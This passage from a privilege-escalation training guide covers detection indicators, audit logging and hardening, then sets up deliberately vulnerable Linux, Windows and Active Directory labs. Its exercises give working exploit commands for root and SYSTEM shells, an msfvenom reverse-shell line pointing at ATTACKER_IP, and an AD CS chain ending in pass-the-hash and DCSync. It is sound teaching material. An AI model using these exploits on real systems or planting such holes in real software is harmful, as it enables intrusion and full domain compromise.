   - Service creation with unusual binary paths

4. Credential Access:
   - LSASS memory access from unusual processes
   - SAM/SECURITY registry hive access
   - Kerberos ticket requests for service accounts (Kerberoasting)
   - DLL loading in LSASS (credential SSP injection)

5. Container Escape:
   - Mount syscalls from containerized processes
   - nsenter execution
   - Writes to /proc/sys or /sys paths from containers
   - Docker socket access from non-docker-management processes
```

#### Audit Logging Configuration

```powershell
# Windows — Enable advanced audit policies
# Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy

# Critical events:
# - 4672: Special privileges assigned to new logon (watch for SeImpersonate)
# - 4697: Service installed
# - 4698: Scheduled task created
# - 4699: Scheduled task deleted
# - 4700: Scheduled task enabled
# - 4732: Member added to security-enabled local group
# - 7045: New service installed (System log)
# - 1102: Audit log cleared (Security log)

# Enable command-line process auditing:
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

# Enable PowerShell script block logging:
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
```

### 9.4 Prevention — Principle of Least Privilege

```
Prevention Hierarchy:

1. Identity Governance
   ├── Just-in-Time (JIT) access for admin privileges
   ├── Privileged Access Workstations (PAW) for admins
   ├── Regular access review and certification
   └── MFA on all privileged accounts

2. System Hardening
   ├── Minimal services running
   ├── Regular patching (especially kernel, AD CS, Print Spooler)
   ├── Disable unnecessary protocols (LLMNR, NBT-NS, WPAD)
   └── Remove default credentials

3. Monitoring & Response
   ├── Behavioral baselines for privileged operations
   ├── Automated alerts on escalation indicators
   ├── Regular privilege audits
   └── Incident response playbooks for escalation events

4. Architecture
   ├── Network segmentation (limit lateral movement)
   ├── Administrative tiering (Tier 0/1/2 model)
   ├── Credential hygiene (unique local admin passwords — LAPS)
   └── Service account isolation (gMSA, dedicated accounts)
```

---

## 10. Lab: Privilege Escalation Practice

### 10.1 Linux Lab — Multi-Vector Vulnerable VM

#### Lab Setup

```bash
# Deploy a vulnerable Linux VM with multiple escalation paths
# Use: Vagrant + VirtualBox or Docker

# Vagrantfile for privesc lab
cat > Vagrantfile << 'EOF'
Vagrant.configure("2") do |config|
  config.vm.box = "ubuntu/jammy64"
  config.vm.hostname = "privesc-lab"
  config.vm.network "private_network", ip: "192.168.56.10"
  config.vm.provision "shell", path: "setup_lab.sh"
end
EOF

# setup_lab.sh — create multiple escalation vectors
cat > setup_lab.sh << 'SETUP'
#!/bin/bash
set -e

# Create low-privilege user
useradd -m -s /bin/bash student
echo "student:student123" | chpasswd

# ===== Vector 1: SUID Binary =====
cat > /tmp/vuln_suid.c << 'C_CODE'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char cmd[256];
    if (argc < 2) {
        printf("Usage: %s <filename>\n", argv[0]);
        return 1;
    }
    // Vulnerable: uses system() which inherits SUID
    snprintf(cmd, sizeof(cmd), "cat %s", argv[1]);
    system(cmd);
    return 0;
}
C_CODE
gcc /tmp/vuln_suid.c -o /usr/local/bin/vuln_reader
chmod u+s /usr/local/bin/vuln_reader
chown root:root /usr/local/bin/vuln_reader

# ===== Vector 2: Sudo Misconfiguration =====
echo "student ALL=(root) NOPASSWD: /usr/bin/find" >> /etc/sudoers.d/student
chmod 440 /etc/sudoers.d/student

# ===== Vector 3: Cron Job with Writable Script =====
cat > /opt/scripts/backup.sh << 'CRON_SCRIPT'
#!/bin/bash
tar czf /backup/data.tar.gz /opt/data/*
CRON_SCRIPT
chmod 777 /opt/scripts/backup.sh
mkdir -p /opt/data /backup
echo "* * * * * root /opt/scripts/backup.sh" >> /etc/crontab

# ===== Vector 4: Capabilities =====
cp /usr/bin/python3 /usr/local/bin/python3_cap
setcap cap_setuid+ep /usr/local/bin/python3_cap

# ===== Vector 5: Writable /etc/passwd (for advanced exercise) =====
# Intentionally set weak permissions on a copy
cp /etc/passwd /opt/passwd_backup
chmod 666 /opt/passwd_backup

# ===== Vector 6: NFS no_root_squash =====
apt-get install -y nfs-kernel-server
mkdir -p /srv/nfs_share
echo "/srv/nfs_share *(rw,sync,no_root_squash,no_subtree_check)" >> /etc/exports
chmod 777 /srv/nfs_share
exportfs -ra
systemctl restart nfs-kernel-server

# ===== Vector 7: Docker Group =====
apt-get install -y docker.io
usermod -aG docker student

echo "[+] Lab setup complete. Login as student:student123"
SETUP
chmod +x setup_lab.sh
```

#### Exercise 1: SUID Exploitation

```bash
# As student user, identify SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Found: /usr/local/bin/vuln_reader
# Analyze behavior
strings /usr/local/bin/vuln_reader
# Shows it uses system("cat <filename>")

# Exploit via command injection (semicolon in filename)
/usr/local/bin/vuln_reader ";/bin/bash -p"

# Alternative: exploit via PATH manipulation if it calls 'cat' without full path
echo '#!/bin/bash
/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
PATH=/tmp:$PATH /usr/local/bin/vuln_reader /etc/hostname
# Result: root shell
```

#### Exercise 2: Sudo Exploitation

```bash
# Check sudo permissions
sudo -l
# (root) NOPASSWD: /usr/bin/find

# Exploit using find's -exec flag
sudo find /tmp -name "*.xyz" -exec /bin/bash \; -quit

# Alternative using find with newer versions
sudo find . -exec /bin/sh \; -quit

# Verify
id
# uid=0(root) gid=0(root) groups=0(root)
```

#### Exercise 3: Cron Job Exploitation

```bash
# Identify cron jobs
cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh

# Check script permissions
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx (writable!)

# Inject payload
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/scripts/backup.sh

# Wait 60 seconds for cron execution
sleep 65

# Check
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root ... /tmp/rootbash

/tmp/rootbash -p
# uid=1001(student) gid=1001(student) euid=0(root)
```

#### Exercise 4: Capabilities Exploitation

```bash
# Enumerate capabilities
getcap -r / 2>/dev/null
# /usr/local/bin/python3_cap = cap_setuid+ep

# Exploit
/usr/local/bin/python3_cap -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Verify
id
# uid=0(root) gid=1001(student)
```

### 10.2 Windows Lab — Service Misconfiguration and Token Privilege

#### Lab Setup

```powershell
# PowerShell script to create vulnerable Windows lab environment
# Run as Administrator

# ===== Create low-privilege user =====
$Password = ConvertTo-SecureString "Student123!" -AsPlainText -Force
New-LocalUser -Name "student" -Password $Password -Description "Lab User"
Add-LocalGroupMember -Group "Users" -Member "student"

# ===== Vector 1: Unquoted Service Path =====
# Create directory structure
New-Item -ItemType Directory -Path "C:\Program Files\Vulnerable Service\Sub Directory" -Force
# Create dummy service binary
Add-Type -TypeDefinition @"
using System;
using System.ServiceProcess;
public class VulnService : ServiceBase {
    protected override void OnStart(string[] args) { }
    protected override void OnStop() { }
    static void Main() { ServiceBase.Run(new VulnService()); }
}
"@ -OutputType ConsoleApplication -OutputAssembly "C:\Program Files\Vulnerable Service\Sub Directory\service.exe"

# Install service WITHOUT quotes
sc.exe create VulnService binPath= "C:\Program Files\Vulnerable Service\Sub Directory\service.exe" start= auto obj= LocalSystem

# Make parent directory writable by Users
icacls "C:\Program Files\Vulnerable Service" /grant "Users:(OI)(CI)M"

# ===== Vector 2: Weak Service Permissions =====
sc.exe create WeakService binPath= "C:\Windows\Temp\weak_svc.exe" start= demand obj= LocalSystem
# Grant authenticated users full control over service
sc.exe sdset WeakService "D:(A;;RPWPCCDCLCSWRCWDWOGA;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)"

# ===== Vector 3: AlwaysInstallElevated =====
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f

# ===== Vector 4: Stored Credentials =====
cmdkey /add:DC01 /user:DOMAIN\admin /pass:AdminP@ssw0rd

# ===== Vector 5: Scheduled Task with Writable Binary =====
New-Item -ItemType Directory -Path "C:\Tasks" -Force
"echo placeholder" | Out-File "C:\Tasks\cleanup.bat"
icacls "C:\Tasks\cleanup.bat" /grant "Users:(F)"
schtasks /create /tn "Cleanup" /tr "C:\Tasks\cleanup.bat" /sc minute /mo 5 /ru SYSTEM

# ===== Vector 6: SeImpersonatePrivilege (simulated via IIS/MSSQL) =====
# Install IIS for realistic service account scenario
Install-WindowsFeature -Name Web-Server -IncludeManagementTools

Write-Host "[+] Lab setup complete. Login as student:Student123!"
```

#### Exercise 1: Unquoted Service Path Exploitation

```cmd
:: As student user
:: Enumerate unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: Identify: C:\Program Files\Vulnerable Service\Sub Directory\service.exe
:: Check write access to intermediate paths
icacls "C:\Program Files\Vulnerable Service"
:: Shows Users have Modify access

:: Create payload at "C:\Program Files\Vulnerable Service\Sub.exe"
:: (In a real scenario, use msfvenom or custom binary)
:: For demonstration:
copy C:\temp\reverse_shell.exe "C:\Program Files\Vulnerable Service\Sub.exe"

:: Restart service (if we can, or wait for reboot)
sc stop VulnService
sc start VulnService
:: Shell received as SYSTEM
```

#### Exercise 2: Weak Service Permissions

```cmd
:: Check service permissions
sc sdshow WeakService
:: Shows Authenticated Users have full control

:: Modify service binary path
sc config WeakService binpath= "C:\temp\shell.exe"
sc config WeakService obj= "LocalSystem" password= ""

:: Start service
sc start WeakService
:: Executes as SYSTEM

:: Alternative — run net command:
sc config WeakService binpath= "cmd /c net localgroup Administrators student /add"
sc start WeakService
:: student is now local admin
```

#### Exercise 3: AlwaysInstallElevated

```cmd
:: Verify both keys are set
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both return 0x1

:: Generate malicious MSI (on attacker machine)
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi > escalate.msi

:: Transfer and install
msiexec /quiet /qn /i C:\temp\escalate.msi
:: Shell received as SYSTEM
```

#### Exercise 4: Token Impersonation (SeImpersonatePrivilege)

```cmd
:: From IIS w3wp.exe or MSSQL xp_cmdshell context:
whoami /priv
:: SeImpersonatePrivilege Enabled

:: Use PrintSpoofer (simplest for modern Windows)
.\PrintSpoofer64.exe -i -c "cmd /c whoami"
:: nt authority\system

:: Or GodPotato for latest versions
.\GodPotato.exe -cmd "cmd /c net localgroup Administrators student /add"
```

### 10.3 Active Directory Lab — Certificate Services Exploitation

#### Lab Environment

```powershell
# Requirements:
# - Domain Controller (Windows Server 2019/2022)
# - AD Certificate Services installed
# - Vulnerable certificate template

# Create vulnerable certificate template (on CA server as Enterprise Admin)
# This creates an ESC1-vulnerable template

# Using certutil/ADSI or the Certificate Templates MMC snap-in:
# 1. Duplicate the "User" template
# 2. Name it "VulnerableTemplate"
# 3. Set "Supply in the request" for Subject Name
# 4. Add "Client Authentication" EKU
# 5. Grant "Domain Users" Enroll permission

# Alternatively, use PowerShell:
Import-Module ActiveDirectory

# Create template with ESC1 conditions
$templateDN = "CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local"
# (Full ADSI creation omitted for brevity — use GUI in lab)
```

#### Exploitation Chain

```bash
# Step 1: Enumerate AD CS (from Linux attacker)
certipy find -u student@lab.local -p 'Student123!' -dc-ip 192.168.56.10 -vulnerable

# Output:
# [*] Found vulnerable template: VulnerableTemplate
#     [ESC1] ENROLLEE_SUPPLIES_SUBJECT + Client Authentication
#     Enrollees: Domain Users

# Step 2: Request certificate as Domain Admin
certipy req -u student@lab.local -p 'Student123!' \
    -ca lab-CA -dc-ip 192.168.56.10 \
    -template VulnerableTemplate \
    -upn administrator@lab.local

# Output:
# [*] Certificate written to administrator.pfx

# Step 3: Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10

# Output:
# [*] Got NT hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Step 4: Pass the hash for Domain Admin access
impacket-psexec lab.local/administrator@192.168.56.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Step 5: DCSync for full domain compromise
impacket-secretsdump lab.local/administrator@192.168.56.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

### 10.4 Documentation Template for Exploitation Chains

```markdown
## Exploitation Chain Report

### Environment
- Target: [hostname/IP]
- Initial Access: [method — web shell, SSH, RDP]
- Starting User: [username]
- Starting Privileges: [uid/groups/integrity level]

### Enumeration Findings
| Vector | Risk | Technique Required |
|--------|------|-------------------|
| [finding] | [High/Medium/Low] | [technique name] |

### Exploitation Path

#### Step 1: [Initial foothold → intermediate privilege]
- Command: `[exact command used]`
- Result: [new privilege level]
- Evidence: [screenshot/output hash]

#### Step 2: [Intermediate → target privilege]
- Command: `[exact command used]`
- Result: [new privilege level]
- Evidence: [screenshot/output hash]

### Final State
- Achieved: [root/SYSTEM/Domain Admin]
- Method: [summarize chain]
- Time: [duration from initial access to escalation]

### Remediation
1. [Specific fix for each vulnerability in chain]
2. [Detection rule that would have caught this]
3. [Preventive control to implement]
```

### 10.5 Practice Resources

| Resource | Type | Focus |
|----------|------|-------|
| HackTheBox — Linux Privesc | Lab machines | Multi-vector Linux escalation |
| TryHackMe — Windows Privesc | Guided rooms | Step-by-step Windows techniques |
| Proving Grounds | OSCP-style labs | Real-world privesc chains |
| VulnHub — SickOs, Kioptrix | Downloadable VMs | Classic escalation paths |
| DVWA + Metasploitable | Docker/VM | Web-to-root chains |
| GOAD (Game of Active Directory) | Full AD lab | AD escalation paths |
| Certified Pre-Owned lab | AD CS focus | Certificate abuse (ESC1-ESC8) |

### 10.6 Automation Script — Linux Privilege Escalation Checker

```python
#!/usr/bin/env python3
"""
privesc_check.py — Lightweight Linux privilege escalation checker.
Run as the low-privilege user to identify potential vectors.
"""

import os
import subprocess
import stat
import grp
import pwd

class PrivescChecker:
    def __init__(self):
        self.uid = os.getuid()
        self.gid = os.getgid()
        self.username = pwd.getpwuid(self.uid).pw_name
        self.groups = [g.gr_name for g in grp.getgrall() if self.username in g.gr_mem]
        self.findings = []

    def run_cmd(self, cmd):
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=10
            )
            return result.stdout.strip()
        except (subprocess.TimeoutExpired, Exception):
            return ""

    def check_suid(self):
        print("[*] Checking SUID binaries...")
        output = self.run_cmd("find / -perm -4000 -type f 2>/dev/null")
        dangerous = [
            "python", "perl", "ruby", "bash", "sh", "env", "find",
            "vim", "vi", "nmap", "awk", "less", "more", "cp", "mv",
            "nano", "tar", "zip", "gcc", "make", "strace", "ltrace"
        ]
        for line in output.split('\n'):
            if any(d in line.lower() for d in dangerous):
                self.findings.append(f"[HIGH] Dangerous SUID: {line}")

    def check_sudo(self):
        print("[*] Checking sudo permissions...")
        output = self.run_cmd("sudo -l 2>/dev/null")
        if "NOPASSWD" in output:
            self.findings.append(f"[HIGH] NOPASSWD sudo: {output}")
        if output and "not allowed" not in output.lower():
            self.findings.append(f"[MEDIUM] Sudo available:\n{output}")

    def check_capabilities(self):
        print("[*] Checking capabilities...")
        output = self.run_cmd("getcap -r / 2>/dev/null")
        dangerous_caps = ["cap_setuid", "cap_dac_read_search", "cap_sys_admin",
                         "cap_dac_override", "cap_sys_ptrace"]
        for line in output.split('\n'):
            if any(c in line for c in dangerous_caps):
                self.findings.append(f"[HIGH] Dangerous capability: {line}")

    def check_writable_paths(self):
        print("[*] Checking writable paths...")
        path_dirs = os.environ.get("PATH", "").split(":")
        for d in path_dirs:
            if os.path.exists(d) and os.access(d, os.W_OK):
                self.findings.append(f"[MEDIUM] Writable PATH directory: {d}")

    def check_cron(self):
        print("[*] Checking cron jobs...")
        crontab = self.run_cmd("cat /etc/crontab 2>/dev/null")
        for line in crontab.split('\n'):
            if line and not line.startswith('#') and 'root' in line:
                # Check if referenced script is writable
                parts = line.split()
                if len(parts) >= 7:
                    script = parts[6] if len(parts) > 6 else ""
                    if script and os.path.exists(script) and os.access(script, os.W_OK):
                        self.findings.append(
                            f"[CRITICAL] Writable root cron script: {script}"
                        )

    def check_docker(self):
        print("[*] Checking docker group membership...")
        if "docker" in self.groups:
            self.findings.append("[CRITICAL] User is in docker group — instant root")

    def check_kernel(self):
        print("[*] Checking kernel version...")
        kernel = self.run_cmd("uname -r")
        self.findings.append(f"[INFO] Kernel: {kernel} — check exploit-suggester")

    def check_sensitive_files(self):
        print("[*] Checking sensitive file permissions...")
        files_to_check = [
            "/etc/shadow", "/etc/sudoers", "/root/.ssh/id_rsa",
            "/root/.bash_history"
        ]
        for f in files_to_check:
            if os.path.exists(f) and os.access(f, os.R_OK):
                self.findings.append(f"[HIGH] Readable sensitive file: {f}")

        if os.path.exists("/etc/passwd") and os.access("/etc/passwd", os.W_OK):
            self.findings.append("[CRITICAL] /etc/passwd is writable!")

    def report(self):
        print("\n" + "=" * 60)
        print("PRIVILEGE ESCALATION FINDINGS")
        print("=" * 60)
        if not self.findings:
            print("[*] No obvious vectors found. Try manual enumeration.")
        for f in sorted(self.findings, key=lambda x: (
            0 if "[CRITICAL]" in x else 1 if "[HIGH]" in x else 2
        )):
            print(f)
        print("=" * 60)

    def run_all(self):
        self.check_suid()
        self.check_sudo()
        self.check_capabilities()
        self.check_writable_paths()
        self.check_cron()
        self.check_docker()
        self.check_kernel()
        self.check_sensitive_files()
        self.report()


if __name__ == "__main__":
    checker = PrivescChecker()
    checker.run_all()
```

### 10.7 Automation Script — Windows Privilege Escalation Checker

```powershell
<#
.SYNOPSIS
    Windows Privilege Escalation Checker
.DESCRIPTION
    Identifies common privilege escalation vectors on Windows systems.
    Run as the low-privilege user to discover potential paths to SYSTEM/Admin.
#>

function Get-PrivEscVectors {
    $findings = @()

    # ===== Token Privileges =====
    Write-Host "[*] Checking token privileges..." -ForegroundColor Cyan
    $privs = whoami /priv 2>$null
    $dangerousPrivs = @(
        "SeImpersonatePrivilege",
        "SeAssignPrimaryTokenPrivilege",
        "SeBackupPrivilege",
        "SeRestorePrivilege",
        "SeDebugPrivilege",
        "SeTakeOwnershipPrivilege",
        "SeLoadDriverPrivilege"
    )
    foreach ($priv in $dangerousPrivs) {
        if ($privs -match $priv) {
            $findings += "[CRITICAL] Dangerous privilege: $priv"
        }
    }

    # ===== Unquoted Service Paths =====
    Write-Host "[*] Checking unquoted service paths..." -ForegroundColor Cyan
    $services = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
        Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.PathName -notmatch 'Windows' }
    foreach ($svc in $services) {
        $findings += "[HIGH] Unquoted service path: $($svc.Name) -> $($svc.PathName)"
    }

    # ===== AlwaysInstallElevated =====
    Write-Host "[*] Checking AlwaysInstallElevated..." -ForegroundColor Cyan
    $hkcu = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $hklm = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    if ($hkcu -eq 1 -and $hklm -eq 1) {
        $findings += "[CRITICAL] AlwaysInstallElevated is enabled — MSI escalation possible"
    }

    # ===== Stored Credentials =====
    Write-Host "[*] Checking stored credentials..." -ForegroundColor Cyan
    $creds = cmdkey /list 2>$null
    if ($creds -match "Target:") {
        $findings += "[HIGH] Stored credentials found: use runas /savecred"
    }

    # ===== Scheduled Tasks with Writable Paths =====
    Write-Host "[*] Checking scheduled tasks..." -ForegroundColor Cyan
    $tasks = schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv -ErrorAction SilentlyContinue
    foreach ($task in $tasks) {
        $action = $task."Task To Run"
        if ($action -and (Test-Path $action -ErrorAction SilentlyContinue)) {
            $acl = Get-Acl $action -ErrorAction SilentlyContinue
            $writable = $acl.Access | Where-Object {
                $_.IdentityReference -match "Users|Everyone|Authenticated" -and
                $_.FileSystemRights -match "Write|FullControl|Modify"
            }
            if ($writable) {
                $findings += "[HIGH] Writable scheduled task binary: $action"
            }
        }
    }

    # ===== Modifiable Services =====
    Write-Host "[*] Checking service permissions..." -ForegroundColor Cyan
    $accesschk = "accesschk.exe"
    if (Test-Path $accesschk) {
        $modifiable = & $accesschk -uwcqv "Authenticated Users" * 2>$null
        if ($modifiable -match "SERVICE_CHANGE_CONFIG") {
            $findings += "[CRITICAL] Modifiable service found — binary path injection possible"
        }
    }

    # ===== Report =====
    Write-Host "`n$('=' * 60)" -ForegroundColor Yellow
    Write-Host "PRIVILEGE ESCALATION FINDINGS" -ForegroundColor Yellow
    Write-Host "$('=' * 60)" -ForegroundColor Yellow

    if ($findings.Count -eq 0) {
        Write-Host "[*] No obvious vectors found. Try WinPEAS for deeper analysis."
    } else {
        $findings | Sort-Object {
            if ($_ -match "\[CRITICAL\]") { 0 }
            elseif ($_ -match "\[HIGH\]") { 1 }
            else { 2 }
        } | ForEach-Object {
            $color = if ($_ -match "\[CRITICAL\]") { "Red" }
                     elseif ($_ -match "\[HIGH\]") { "Yellow" }
                     else { "White" }
            Write-Host $_ -ForegroundColor $color
        }
    }
    Write-Host "$('=' * 60)" -ForegroundColor Yellow
}

Get-PrivEscVectors
```

---

## Quick Reference: Privilege Escalation Decision Tree

```
┌─────────────────────────────────────────────────────────┐
│              INITIAL SHELL OBTAINED                       │
│         What platform are we on?                        │
└────────────────────┬────────────────────────────────────┘
                     │
          ┌──────────┴──────────┐
          │                     │
     ┌────▼────┐          ┌────▼────┐
     │  LINUX  │          │ WINDOWS │
     └────┬────┘          └────┬────┘
          │                     │
     ┌────▼──────────┐    ┌────▼──────────┐
     │ sudo -l       │    │ whoami /priv   │
     │ SUID binaries │    │ Service perms  │
     │ Capabilities  │    │ Stored creds   │
     │ Cron jobs     │    │ Unquoted paths │
     │ Kernel ver    │    │ Patch level    │
     │ Docker group  │    │ UAC level      │
     └────┬──────────┘    └────┬──────────┘
          │                     │
     ┌────▼──────────┐    ┌────▼──────────┐
     │ Found vector? │    │ Found vector? │
     │ YES → Exploit │    │ YES → Exploit │
     │ NO → LinPEAS  │    │ NO → WinPEAS  │
     │ NO → Kernel   │    │ NO → Potato   │
     └───────────────┘    └───────────────┘
```

---

## Summary of Critical Tools

| Tool | Platform | Purpose | URL |
|------|----------|---------|-----|
| LinPEAS | Linux | Comprehensive enumeration | github.com/peass-ng/PEASS-ng |
| WinPEAS | Windows | Comprehensive enumeration | github.com/peass-ng/PEASS-ng |
| pspy | Linux | Process monitoring without root | github.com/DominicBreuker/pspy |
| GTFOBins | Linux | SUID/sudo binary exploitation | gtfobins.github.io |
| LOLBAS | Windows | Living-off-the-land binaries | lolbas-project.github.io |
| PowerUp | Windows | Service/registry exploitation | github.com/PowerShellMafia/PowerSploit |
| Rubeus | Windows/AD | Kerberos abuse | github.com/GhostPack/Rubeus |
| Certipy | AD CS | Certificate exploitation | github.com/ly4k/Certipy |
| Impacket | Multi | Protocol-level exploitation | github.com/fortra/impacket |
| BloodHound | AD | Attack path visualization | github.com/BloodHoundAD/BloodHound |
| PrintSpoofer | Windows | Token impersonation | github.com/itm4n/PrintSpoofer |
| GodPotato | Windows | Universal Potato | github.com/BeichenDream/GodPotato |
| Mimikatz | Windows | Credential extraction | github.com/gentilkiwi/mimikatz |

---

## References

- MITRE ATT&CK Privilege Escalation: https://attack.mitre.org/tactics/TA0004/
- HackTricks: https://book.hacktricks.xyz/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- SpecterOps — Certified Pre-Owned: https://posts.specterops.io/certified-pre-owned-d95910965cd2
- Will Schroeder — AD CS Attacks: https://www.thehacker.recipes/ad/movement/adcs
- itm4n — Windows Local Privilege Escalation: https://itm4n.github.io/
- Sushant747 — Total OSCP Guide (Linux Privesc): https://sushant747.gitbooks.io/total-oscp-guide/

---

*Document revision: 2026-05-07*
